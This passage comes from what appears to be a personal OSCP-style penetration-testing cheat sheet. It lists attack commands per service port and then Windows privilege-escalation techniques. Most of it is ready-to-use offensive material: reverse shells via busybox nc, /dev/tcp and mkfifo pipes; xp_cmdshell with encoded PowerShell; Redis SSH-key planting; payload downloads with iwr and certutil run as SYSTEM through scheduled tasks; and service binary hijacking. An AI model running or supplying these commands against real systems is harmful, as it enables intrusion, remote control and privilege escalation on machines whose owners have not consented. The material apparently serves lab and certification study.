<span class="nx">hydra</span> <span class="o">-</span><span class="nx">l</span> <span class="o">&lt;</span><span class="nx">username</span><span class="o">&gt;</span> <span class="o">-</span><span class="nx">P</span> <span class="o">/</span><span class="nx">path</span><span class="o">/</span><span class="nx">to</span><span class="o">/</span><span class="nx">passwords</span><span class="p">.</span><span class="nx">txt</span> <span class="o">&lt;</span><span class="nx">IP</span><span class="o">&gt;</span> <span class="nx">smtp</span> <span class="o">-</span><span class="nx">V</span>
</code></pre></div></div>

<p>RCE</p>

<blockquote>
  <p>https://github.com/mxrch/snmp-shell</p>

</blockquote>

<h3 id="389---ldap">389 - LDAP</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//anonymous ldap</span>
<span class="nx">nxc</span> <span class="nx">ldap</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">u</span> <span class="dl">""</span> <span class="o">-</span><span class="nx">p</span> <span class="dl">""</span> <span class="o">-</span><span class="nx">M</span> <span class="kd">get</span><span class="o">-</span><span class="nx">desc</span><span class="o">-</span><span class="nx">users</span> <span class="c1">// -L check all available modules</span>

<span class="nx">ldapsearch</span> <span class="o">-</span><span class="nx">x</span> <span class="o">-</span><span class="nx">H</span> <span class="nx">ldap</span><span class="p">:</span><span class="c1">//192.168.1.1 -b "dc=hutch,dc=offsec" &gt; ldap.txt </span>
<span class="c1">//list users</span>
<span class="nx">cat</span> <span class="nx">ldap</span><span class="p">.</span><span class="nx">txt</span> <span class="o">|</span> <span class="nx">grep</span> <span class="o">-</span><span class="nx">i</span> <span class="dl">"</span><span class="s2">samaccountname</span><span class="dl">"</span> 
<span class="nx">cat</span> <span class="nx">raw_users</span><span class="p">.</span><span class="nx">txt</span> <span class="o">|</span> <span class="nx">cut</span> <span class="o">-</span><span class="nx">d</span><span class="p">:</span> <span class="o">-</span><span class="nx">f2</span> <span class="o">|</span> <span class="nx">tr</span> <span class="o">-</span><span class="nx">d</span> <span class="dl">"</span><span class="s2"> </span><span class="dl">"</span> <span class="o">&gt;</span> <span class="nx">users</span><span class="p">.</span><span class="nx">txt</span>
<span class="c1">//list description =&gt; password in plaintext</span>
<span class="nx">cat</span> <span class="nx">ldap</span><span class="p">.</span><span class="nx">txt</span> <span class="o">|</span> <span class="nx">grep</span> <span class="o">-</span><span class="nx">i</span> <span class="dl">"</span><span class="s2">description</span><span class="dl">"</span> 

<span class="nx">nxc</span> <span class="nx">ldap</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">u</span> <span class="dl">""</span>  <span class="o">-</span><span class="nx">p</span> <span class="dl">""</span> <span class="o">--</span><span class="nx">users</span>

<span class="nx">nmap</span> <span class="o">-</span><span class="nx">sV</span> <span class="o">--</span><span class="nx">script</span> <span class="dl">"</span><span class="s2">ldap* and not brute</span><span class="dl">"</span> <span class="nx">$IP</span>
</code></pre></div></div>

<h3 id="1433-mssql">1433 MSSQL</h3>

<p>rce</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">SQL</span> <span class="p">(</span><span class="nx">FAKE</span><span class="err">\</span><span class="nx">sql_svc</span>  <span class="nx">dbo</span><span class="p">@</span><span class="nd">master</span><span class="p">)</span><span class="o">&gt;</span> <span class="nx">EXEC</span> <span class="nx">sp_configure</span> <span class="dl">'</span><span class="s1">show advanced options</span><span class="dl">'</span><span class="p">,</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">RECONFIGURE</span><span class="p">;</span> <span class="nx">EXEC</span> <span class="nx">sp_configure</span> <span class="dl">'</span><span class="s1">xp_cmdshell</span><span class="dl">'</span><span class="p">,</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">RECONFIGURE</span><span class="p">;</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">INFO</span><span class="p">(</span><span class="nx">MS02</span><span class="err">\</span><span class="nx">SQLEXPRESS</span><span class="p">):</span> <span class="nx">Line</span> <span class="mi">185</span><span class="p">:</span> <span class="nx">Configuration</span> <span class="nx">option</span> <span class="dl">'</span><span class="s1">show advanced options</span><span class="dl">'</span> <span class="nx">changed</span> <span class="k">from</span> <span class="mi">1</span> <span class="nx">to</span> <span class="mi">1</span><span class="p">.</span> <span class="nx">Run</span> <span class="nx">the</span> <span class="nx">RECONFIGURE</span> <span class="nx">statement</span> <span class="nx">to</span> <span class="nx">install</span><span class="p">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">INFO</span><span class="p">(</span><span class="nx">MS02</span><span class="err">\</span><span class="nx">SQLEXPRESS</span><span class="p">):</span> <span class="nx">Line</span> <span class="mi">185</span><span class="p">:</span> <span class="nx">Configuration</span> <span class="nx">option</span> <span class="dl">'</span><span class="s1">xp_cmdshell</span><span class="dl">'</span> <span class="nx">changed</span> <span class="k">from</span> <span class="mi">1</span> <span class="nx">to</span> <span class="mi">1</span><span class="p">.</span> <span class="nx">Run</span> <span class="nx">the</span> <span class="nx">RECONFIGURE</span> <span class="nx">statement</span> <span class="nx">to</span> <span class="nx">install</span><span class="p">.</span>

<span class="nx">SQL</span> <span class="p">(</span><span class="nx">FAKE</span><span class="err">\</span><span class="nx">sql_svc</span>  <span class="nx">dbo</span><span class="p">@</span><span class="nd">master</span><span class="p">)</span><span class="o">&gt;</span> <span class="nx">EXEC</span> <span class="nx">xp_cmdshell</span> <span class="dl">'</span><span class="s1">powershell -e JABjAGwAaQ...</span><span class="dl">'</span><span class="p">;</span>
</code></pre></div></div>
<p>LigoloNG: Add tunnel bridge if mssql can only access internal machine</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="nx">Agent</span> <span class="p">:</span> <span class="nx">OSCP</span><span class="err">\</span><span class="nx">web_svc</span><span class="p">@</span><span class="nd">MS01</span><span class="p">]</span> <span class="err">»</span> <span class="nx">listener_add</span> <span class="o">--</span><span class="nx">addr</span> <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">8082</span> <span class="o">--</span><span class="nx">to</span> <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">8081</span> <span class="o">--</span><span class="nx">tcp</span>
<span class="c1">//transfer file</span>
<span class="nx">python3</span> <span class="o">-</span><span class="nx">m</span> <span class="nx">http</span><span class="p">.</span><span class="nx">server</span> <span class="mi">8081</span> <span class="err">#</span><span class="nx">klai</span>
<span class="nx">iwr</span> <span class="o">-</span><span class="nx">uri</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//10.10.185.147:8082/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe </span>
</code></pre></div></div>

<h3 id="2323-landesk-remote-management">2323 LANDesk remote management</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">telnet</span> <span class="mf">172.16</span><span class="p">.</span><span class="mf">221.31</span> <span class="mi">2323</span>
<span class="nx">login</span><span class="p">:</span><span class="nx">root</span>
</code></pre></div></div>

<h3 id="3000-aerospike">3000 Aerospike</h3>

<h3 id="3128---squid">3128 - Squid</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//add following line to /etc/proxychains4.conf</span>
<span class="nx">http</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="mi">3128</span> <span class="nx">ext_acc</span> <span class="nx">Passw0rd</span><span class="o">!</span>

<span class="nx">proxychains</span> <span class="nx">nmap</span> <span class="o">-</span><span class="nx">sT</span> <span class="o">-</span><span class="nx">Pn</span> <span class="mf">172.16</span><span class="p">.</span><span class="mf">231.31</span>  <span class="o">--</span><span class="nx">min</span><span class="o">-</span><span class="nx">rate</span> <span class="mi">500</span>
<span class="nx">foxyproxy</span> <span class="nx">extension</span> <span class="k">for</span> <span class="nx">firefox</span>
</code></pre></div></div>

<h3 id="3387---alternative-port-for-rdp">3387 - Alternative port for Rdp</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">xfreerdp</span> <span class="nx">cpub</span><span class="o">-</span><span class="nx">SkylarkStatus</span><span class="o">-</span><span class="nx">QuickSessionCollection</span><span class="o">-</span><span class="nx">CmsRdsh</span><span class="p">.</span><span class="nx">rdp</span>  <span class="o">/</span><span class="nx">u</span><span class="p">:</span><span class="nx">kiosk</span> <span class="o">/</span><span class="nx">p</span><span class="p">:</span><span class="nx">password</span> <span class="o">/</span><span class="nx">d</span><span class="p">:</span><span class="nx">skylark</span><span class="p">.</span><span class="nx">com</span> <span class="o">/</span><span class="nx">v</span><span class="p">:</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span>
</code></pre></div></div>

<h3 id="5985---winrm">5985 - Winrm</h3>

<h3 id="6379---redis">6379 - Redis</h3>

<p>4.x / 5.x RCE without username and password(tested on 5.0.9)</p>

<blockquote>
  <p>https://github.com/vulhub/redis-rogue-getshell</p>

</blockquote>

<blockquote>
  <p>https://www.rapid7.com/db/modules/exploit/linux/redis/redis_unauth_exec/ (metasploit)</p>

</blockquote>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">cd</span> <span class="p">.</span><span class="o">/</span><span class="nx">RedisModulesSDK</span> <span class="o">&amp;&amp;</span> <span class="nx">make</span>
<span class="nx">python3</span> <span class="nx">redis</span><span class="o">-</span><span class="nx">master</span><span class="p">.</span><span class="nx">py</span> <span class="o">-</span><span class="nx">r</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">243.1</span> <span class="o">-</span><span class="nx">p</span> <span class="mi">6379</span> <span class="o">-</span><span class="nx">L</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">45.1</span> <span class="o">-</span><span class="nx">P</span> <span class="mi">6379</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">RedisModulesSDK</span><span class="o">/</span><span class="nx">exp</span><span class="p">.</span><span class="nx">so</span> <span class="o">-</span><span class="nx">c</span> <span class="dl">"</span><span class="s2">busybox nc 192.168.1.1 8080 -e /bin/sh</span><span class="dl">"</span>
</code></pre></div></div>

<p>If we have username, we can get user’s ssh path with command <code class="language-plaintext highlighter-rouge">config get dir</code> and set dir to ssh directory</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$</span> <span class="nx">ssh</span><span class="o">-</span><span class="nx">keygen</span> <span class="o">-</span><span class="nx">t</span> <span class="nx">rsa</span>
<span class="nx">$</span> <span class="p">(</span><span class="nx">echo</span> <span class="o">-</span><span class="nx">e</span> <span class="dl">"</span><span class="se">\n\n</span><span class="dl">"</span><span class="p">;</span> <span class="nx">cat</span> <span class="nx">id_rsa</span><span class="p">.</span><span class="nx">pub</span><span class="p">;</span> <span class="nx">echo</span> <span class="o">-</span><span class="nx">e</span> <span class="dl">"</span><span class="se">\n\n</span><span class="dl">"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">pub</span><span class="p">.</span><span class="nx">txt</span>
<span class="nx">$</span> <span class="nx">cat</span> <span class="nx">pub</span><span class="p">.</span><span class="nx">txt</span> <span class="o">|</span> <span class="nx">redis</span><span class="o">-</span><span class="nx">cli</span> <span class="o">-</span><span class="nx">h</span> <span class="o">&lt;</span><span class="nx">IP</span><span class="o">&gt;</span> <span class="o">-</span><span class="nx">x</span> <span class="kd">set</span> <span class="nx">ssh_key</span>
<span class="nx">$</span> <span class="nx">redis</span><span class="o">-</span><span class="nx">cli</span> <span class="o">-</span><span class="nx">h</span> <span class="o">&lt;</span><span class="nx">IP</span><span class="o">&gt;</span>
<span class="o">&gt;</span> <span class="nx">config</span> <span class="kd">set</span> <span class="nx">dir</span> <span class="o">/</span><span class="kd">var</span><span class="sr">/lib/</span><span class="nx">redis</span><span class="o">/</span><span class="p">.</span><span class="nx">ssh</span>
<span class="nx">OK</span>
<span class="o">&gt;</span> <span class="nx">config</span> <span class="kd">set</span> <span class="nx">dbfilename</span> <span class="dl">"</span><span class="s2">authorized_keys</span><span class="dl">"</span>
<span class="nx">OK</span>
<span class="o">&gt;</span> <span class="nx">save</span>
<span class="nx">OK</span>
</code></pre></div></div>

<h3 id="8000---jdwp">8000 - JDWP</h3>

<blockquote>
  <p>https://github.com/hugsy/jdwp-shellifier</p>

</blockquote>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="o">/</span><span class="nx">jdwp</span><span class="p">.</span><span class="nx">py</span> <span class="o">-</span><span class="nx">t</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">p</span> <span class="mi">8000</span>   <span class="o">--</span><span class="nx">cmd</span> <span class="dl">'</span><span class="s1">busybox nc 192.168.1.1 8080 -e /bin/bash</span><span class="dl">'</span> 
 <span class="nx">nc</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">206.1</span> <span class="mi">5000</span> <span class="o">-</span><span class="nx">z</span> 
</code></pre></div></div>

<h3 id="8021---freeswitch">8021 - FreeSWITCH</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">https</span><span class="p">:</span><span class="c1">//www.exploit-db.com/exploits/47799</span>
</code></pre></div></div>

<h3 id="10000-intentional">&gt;10000 (intentional)</h3>

<p>JAMES Remote Admin 2.3.2</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">https</span><span class="p">:</span><span class="c1">//www.exploit-db.com/exploits/35513</span>
<span class="nx">payload</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">/bin/bash -i &gt;&amp; /dev/tcp/192.168.45.201/4444 0&gt;&amp;1</span><span class="dl">'</span>
</code></pre></div></div>

<h3 id="11211---memcached"><strong>11211 -</strong> Memcached</h3>

<p>Memcached 1.4.33 RCE exploit</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//https://github.com/CarlosG13/CVE-2021-33026</span>
<span class="nx">python3</span> <span class="nx">poc</span><span class="p">.</span><span class="nx">py</span> <span class="o">--</span><span class="nx">rhost</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">185.1</span> <span class="o">--</span><span class="nx">rport</span> <span class="mi">5000</span> <span class="o">--</span><span class="nx">cmd</span> <span class="dl">"</span><span class="s2">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.1.1 80 &gt;/tmp/f</span><span class="dl">"</span> <span class="o">--</span><span class="nx">cookie</span> <span class="dl">"</span><span class="s2">session:650469fb-98ab-4dc5-ad58-00a40eb6658c</span><span class="dl">"</span>
</code></pre></div></div>

<h3 id="65432---rpcpy">65432 - rpc.py</h3>

<p>rpc.py in /opt</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">https</span><span class="p">:</span><span class="c1">//www.exploit-db.com/exploits/50983</span>
</code></pre></div></div>

<h3 id="unknown">Unknown</h3>

<p>grab banner</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">nc</span> <span class="o">&lt;</span><span class="nx">ip</span><span class="o">&gt;</span> <span class="p">&lt;</span><span class="nt">port</span><span class="p">&gt;</span>
</code></pre></div></div>

<h1 id="privilege-escalation">Privilege Escalation</h1>

<h2 id="windows"><strong>Windows</strong></h2>

<h3 id="autoscan">AutoScan</h3>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mf">.</span><span class="err">\</span><span class="n">winPeas</span><span class="mf">.</span><span class="n">exe</span> <span class="n">log</span>
<span class="n">cat</span> <span class="n">out</span><span class="mf">.</span><span class="n">txt</span> <span class="o">|</span> <span class="n">less</span> <span class="o">-</span><span class="n">r</span>

<span class="n">powershell</span> <span class="o">-</span><span class="n">ep</span> <span class="n">bypass</span> <span class="o">-</span><span class="n">c</span> <span class="s2">". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"</span>
</code></pre></div></div>

<h3 id="basic-info">Basic Info</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">whoami</span> 
<span class="p">[</span><span class="nx">System</span><span class="p">.</span><span class="nx">Security</span><span class="p">.</span><span class="nx">Principal</span><span class="p">.</span><span class="nx">WindowsIdentity</span><span class="p">]::</span><span class="nx">GetCurrent</span><span class="p">().</span><span class="nx">Name</span>
<span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Windows</span><span class="err">\</span><span class="nx">System32</span><span class="err">\</span><span class="nx">whoami</span><span class="p">.</span><span class="nx">exe</span>
<span class="nx">systeminfo</span>
<span class="nx">whoami</span> <span class="o">/</span><span class="nx">groups</span>
<span class="nx">Get</span><span class="o">-</span><span class="nx">LocalUser</span>
<span class="nx">Get</span><span class="o">-</span><span class="nx">LocalGroup</span>
<span class="nx">Get</span><span class="o">-</span><span class="nx">LocalGroupMember</span> <span class="nx">admin</span>
<span class="nx">net</span> <span class="nx">user</span> <span class="nx">admin</span>
<span class="nx">ipconfig</span> <span class="o">/</span><span class="nx">all</span>
<span class="nx">netstat</span> <span class="o">-</span><span class="nx">ano</span>
<span class="nx">Get</span><span class="o">-</span><span class="nx">Process</span>
<span class="p">(</span><span class="kd">get</span><span class="o">-</span><span class="nx">process</span> <span class="o">-</span><span class="nx">Id</span> <span class="mi">2308</span><span class="p">).</span><span class="nx">path</span> <span class="c1">//get binary path</span>
<span class="nx">Get</span><span class="o">-</span><span class="nx">ItemProperty</span> <span class="dl">"</span><span class="s2">HKLM:</span><span class="se">\</span><span class="s2">SOFTWARE</span><span class="se">\</span><span class="s2">Wow6432Node</span><span class="se">\</span><span class="s2">Microsoft</span><span class="se">\</span><span class="s2">Windows</span><span class="se">\</span><span class="s2">CurrentVersion</span><span class="se">\</span><span class="s2">Uninstall</span><span class="se">\</span><span class="s2">*</span><span class="dl">"</span> <span class="o">|</span> <span class="nx">select</span> <span class="nx">displayname</span>
<span class="nx">Get</span><span class="o">-</span><span class="nx">ItemProperty</span> <span class="dl">"</span><span class="s2">HKLM:</span><span class="se">\</span><span class="s2">SOFTWARE</span><span class="se">\</span><span class="s2">Microsoft</span><span class="se">\</span><span class="s2">Windows</span><span class="se">\</span><span class="s2">CurrentVersion</span><span class="se">\</span><span class="s2">Uninstall</span><span class="se">\</span><span class="s2">*</span><span class="dl">"</span> <span class="o">|</span> <span class="nx">select</span> <span class="nx">displayname</span>
</code></pre></div></div>

<h3 id="switch-shell">Switch shell</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">%</span><span class="nx">SYSTEMROOT</span><span class="o">%</span><span class="err">\\</span><span class="nx">System32</span><span class="err">\\</span><span class="nx">WindowsPowerShell</span><span class="err">\\</span><span class="nx">v1</span><span class="p">.</span><span class="mi">0</span><span class="err">\\</span><span class="nx">powershell</span><span class="p">.</span><span class="nx">exe</span> <span class="o">-</span><span class="nx">ep</span> <span class="nx">bypass</span>
<span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Windows</span><span class="err">\</span><span class="nx">System32</span><span class="err">\</span><span class="nx">WindowsPowershell</span><span class="err">\</span><span class="nx">v1</span><span class="p">.</span><span class="mi">0</span><span class="err">\</span><span class="nx">powershell</span><span class="p">.</span><span class="nx">exe</span>
</code></pre></div></div>

<h3 id="installed-program">Installed program</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ls</span> <span class="dl">'</span><span class="s1">C:</span><span class="se">\</span><span class="s1">Program Files (x86)</span><span class="dl">'</span>
<span class="nx">PaperStream</span> <span class="nx">IP</span> <span class="p">(</span><span class="nx">TWAIN</span><span class="p">)</span> <span class="mf">1.42</span><span class="p">.</span><span class="mf">0.5685</span> <span class="o">-</span> <span class="nx">Local</span> <span class="nx">Privilege</span> <span class="nx">Escalation</span> <span class="c1">//https://www.exploit-db.com/exploits/49382</span>
<span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Windows</span><span class="err">\</span><span class="nx">System32</span><span class="err">\</span><span class="nx">WindowsPowershell</span><span class="err">\</span><span class="nx">v1</span><span class="p">.</span><span class="mi">0</span><span class="err">\</span><span class="nx">powershell</span><span class="p">.</span><span class="nx">exe</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Windows</span><span class="err">\</span><span class="nx">Temp</span><span class="err">\</span><span class="nx">exploit</span><span class="p">.</span><span class="nx">ps1</span>
</code></pre></div></div>

<h3 id="old-os-version">Old OS Version</h3>

<p>MS11-046: &lt;Windows Server 2008 sp1 x86</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">https</span><span class="p">:</span><span class="c1">//www.exploit-db.com/exploits/40564 #compiled on linux</span>
</code></pre></div></div>

<h3 id="local-service">Local Service</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">check</span> <span class="nx">service</span> <span class="nx">running</span> <span class="nx">on</span> <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span> <span class="nx">or</span> <span class="nx">second</span> <span class="nx">network</span> <span class="kr">interface</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">191.254</span>
<span class="nx">TCP</span>        <span class="mf">10.10</span><span class="p">.</span><span class="mf">191.254</span>         <span class="mi">40000</span>        <span class="nx">powershell</span>

<span class="nx">net</span> <span class="nx">start</span>
<span class="nx">wmic</span> <span class="nx">service</span> <span class="nx">list</span> <span class="nx">brief</span>
<span class="nx">sc</span> <span class="nx">query</span>
<span class="nx">Get</span><span class="o">-</span><span class="nx">Service</span>

<span class="nx">cmd</span> <span class="o">/</span><span class="nx">c</span> <span class="nx">sc</span> <span class="nx">qc</span> <span class="nx">mysql</span> <span class="err">#</span><span class="nx">check</span> <span class="nx">ownership</span>
<span class="nx">sc</span><span class="p">.</span><span class="nx">exe</span> <span class="nx">qc</span> <span class="nx">MySQL</span>
</code></pre></div></div>

<h3 id="scheduled-tasks">Scheduled Tasks</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">schtasks</span> <span class="o">/</span><span class="nx">query</span> <span class="o">/</span><span class="nx">fo</span> <span class="nx">LIST</span> <span class="o">/</span><span class="nx">v</span> <span class="o">&gt;</span> <span class="nx">schtasks</span><span class="p">.</span><span class="nx">txt</span>
<span class="nx">Get</span><span class="o">-</span><span class="nx">ScheduledTask</span> <span class="o">|</span> <span class="nx">where</span> <span class="p">{</span><span class="nx">$_</span><span class="p">.</span><span class="nx">TaskPath</span> <span class="o">-</span><span class="nx">notlike</span> <span class="dl">"</span><span class="se">\</span><span class="s2">Microsoft*</span><span class="dl">"</span><span class="p">}</span> <span class="o">|</span> <span class="nx">ft</span> <span class="nx">TaskName</span><span class="p">,</span><span class="nx">TaskPath</span><span class="p">,</span><span class="nx">State</span>
<span class="nx">Get</span><span class="o">-</span><span class="nx">ScheduledTask</span> <span class="o">-</span><span class="nx">TaskName</span> <span class="dl">"</span><span class="s2">Task Name</span><span class="dl">"</span> <span class="o">-</span><span class="nx">ErrorAction</span> <span class="nx">SilentlyContinue</span>
<span class="nx">icacls</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">steve</span><span class="err">\</span><span class="nx">Pictures</span><span class="err">\</span><span class="nx">BackendCacheCleanup</span><span class="p">.</span><span class="nx">exe</span>
<span class="nx">iwr</span> <span class="o">-</span><span class="nx">Uri</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//192.168.119.3/rs.exe -Outfile BackendCacheCleanup.exe</span>
<span class="nx">move</span> <span class="p">.</span><span class="err">\</span><span class="nx">Pictures</span><span class="err">\</span><span class="nx">BackendCacheCleanup</span><span class="p">.</span><span class="nx">exe</span> <span class="nx">BackendCacheCleanup</span><span class="p">.</span><span class="nx">exe</span><span class="p">.</span><span class="nx">bak</span>
<span class="nx">move</span> <span class="p">.</span><span class="err">\</span><span class="nx">BackendCacheCleanup</span><span class="p">.</span><span class="nx">exe</span> <span class="p">.</span><span class="err">\</span><span class="nx">Pictures</span><span class="o">\</span>
</code></pre></div></div>

<p>Escalate from admin to system</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">schtasks</span> <span class="o">/</span><span class="nx">Create</span> <span class="o">/</span><span class="nx">RU</span> <span class="dl">"</span><span class="s2">SYSTEM</span><span class="dl">"</span> <span class="o">/</span><span class="nx">SC</span> <span class="nx">ONLOGON</span> <span class="o">/</span><span class="nx">TN</span> <span class="dl">"</span><span class="s2">SchedPE</span><span class="dl">"</span> <span class="o">/</span><span class="nx">TR</span> <span class="dl">"</span><span class="s2">C:</span><span class="se">\</span><span class="s2">Users</span><span class="se">\</span><span class="s2">Adrian</span><span class="se">\r</span><span class="s2">s.exe</span><span class="dl">"</span>
<span class="nx">schtasks</span> <span class="o">/</span><span class="nx">Create</span> <span class="o">/</span><span class="nx">RU</span> <span class="dl">"</span><span class="s2">SYSTEM</span><span class="dl">"</span> <span class="o">/</span><span class="nx">SC</span> <span class="nx">MINUTE</span> <span class="o">/</span><span class="nx">TN</span> <span class="dl">"</span><span class="s2">SchedPE</span><span class="dl">"</span> <span class="o">/</span><span class="nx">TR</span> <span class="dl">"</span><span class="s2">C:</span><span class="se">\</span><span class="s2">Users</span><span class="se">\</span><span class="s2">Adrian</span><span class="se">\r</span><span class="s2">s.exe</span><span class="dl">"</span>
<span class="nx">schtasks</span> <span class="o">/</span><span class="nx">Create</span> <span class="o">/</span><span class="nx">RU</span> <span class="dl">"</span><span class="s2">SYSTEM</span><span class="dl">"</span> <span class="o">/</span><span class="nx">SC</span> <span class="nx">ONLOGON</span> <span class="o">/</span><span class="nx">TN</span> <span class="dl">"</span><span class="s2">SchedPE</span><span class="dl">"</span> <span class="o">/</span><span class="nx">TR</span> <span class="dl">"</span><span class="s2">cmd /c certutil.exe -urlcache -split -f http://192.168.45.182:8888/supershell/compile/download/test_182.exe C:</span><span class="se">\</span><span class="s2">Windows</span><span class="se">\</span><span class="s2">Temp</span><span class="se">\t</span><span class="s2">est_158.exe &amp; C:</span><span class="se">\</span><span class="s2">Windows</span><span class="se">\</span><span class="s2">Temp</span><span class="se">\t</span><span class="s2">est_158.exe
</span></code></pre></div></div>

<h3 id="service-binary-hijacking">Service Binary Hijacking</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Get</span><span class="o">-</span><span class="nx">CimInstance</span> <span class="o">-</span><span class="nx">ClassName</span> <span class="nx">win32_service</span> <span class="o">|</span> <span class="nx">Select</span> <span class="nx">Name</span><span class="p">,</span><span class="nx">State</span><span class="p">,</span><span class="nx">PathName</span> <span class="o">|</span> <span class="nx">Where</span><span class="o">-</span><span class="nb">Object</span> <span class="p">{</span><span class="nx">$_</span><span class="p">.</span><span class="nx">State</span> <span class="o">-</span><span class="nx">like</span> <span class="dl">'</span><span class="s1">Running</span><span class="dl">'</span><span class="p">}</span>
<span class="nx">icacls</span> <span class="dl">"</span><span class="s2">C:</span><span class="se">\</span><span class="s2">xampp</span><span class="se">\</span><span class="s2">apache</span><span class="se">\</span><span class="s2">bin</span><span class="se">\</span><span class="s2">httpd.exe</span><span class="dl">"</span>
<span class="nx">whoami</span> <span class="o">/</span><span class="nx">group</span>
<span class="nx">iwr</span> <span class="o">-</span><span class="nx">uri</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//192.168.119.3/rs.exe -Outfile rs.exe</span>
<span class="nx">move</span><span class="o">-</span><span class="nx">item</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">xampp</span><span class="err">\</span><span class="nx">mysql</span><span class="err">\</span><span class="nx">bin</span><span class="err">\</span><span class="nx">mysqld</span><span class="p">.</span><span class="nx">exe</span> <span class="nx">mysqld</span><span class="p">.</span><span class="nx">exe</span>
<span class="nx">move</span><span class="o">-</span><span class="nx">item</span> <span class="p">.</span><span class="err">\</span><span class="nx">rs</span><span class="p">.</span><span class="nx">exe</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">xampp</span><span class="err">\</span><span class="nx">mysql</span><span class="err">\</span><span class="nx">bin</span><span class="err">\</span><span class="nx">mysqld</span><span class="p">.</span><span class="nx">exe</span>

<span class="c1">//start mode</span>
<span class="nx">Get</span><span class="o">-</span><span class="nx">CimInstance</span> <span class="o">-</span><span class="nx">ClassName</span> <span class="nx">win32_service</span> <span class="o">|</span> <span class="nx">Select</span> <span class="nx">Name</span><span class="p">,</span> <span class="nx">StartMode</span> <span class="o">|</span> <span class="nx">Where</span><span class="o">-</span><span class="nb">Object</span> <span class="p">{</span><span class="nx">$_</span><span class="p">.</span><span class="nx">Name</span> <span class="o">-</span><span class="nx">like</span> <span class="dl">'</span><span class="s1">mysql</span><span class="dl">'</span><span class="p">}</span>
<span class="nx">shutdown</span> <span class="o">/</span><span class="nx">r</span> <span class="o">/</span><span class="nx">t</span> <span class="mi">0</span> <span class="err">#</span><span class="nx">SeShutDownPrivilege</span> <span class="o">=&gt;</span> <span class="nx">reboot</span>

<span class="c1">//powerUp.ps1</span>
<span class="k">import</span><span class="o">-</span><span class="nx">module</span> <span class="p">.</span><span class="err">\</span><span class="nx">PowerUp</span><span class="p">.</span><span class="nx">ps1</span>
<span class="nx">Invoke</span><span class="o">-</span><span class="nx">AllChecks</span>
<span class="nx">Get</span><span class="o">-</span><span class="nx">ModifiableServiceFile</span>
